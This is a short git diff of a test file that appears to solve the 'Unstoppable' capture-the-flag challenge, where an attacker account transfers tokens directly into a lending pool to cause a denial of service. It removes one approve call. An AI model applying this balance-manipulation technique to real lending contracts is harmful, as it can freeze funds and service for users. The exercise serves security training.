@@ -53,7 +53,6 @@ describe("[Challenge] Unstoppable", function () {
 		/** CODE YOUR EXPLOIT HERE */
 		// denial of service
 		expect(await this.pool.poolBalance()).to.eq(TOKENS_IN_POOL);
-		await this.token.approve(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);
 		await this.token
 			.connect(attacker)
 			.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
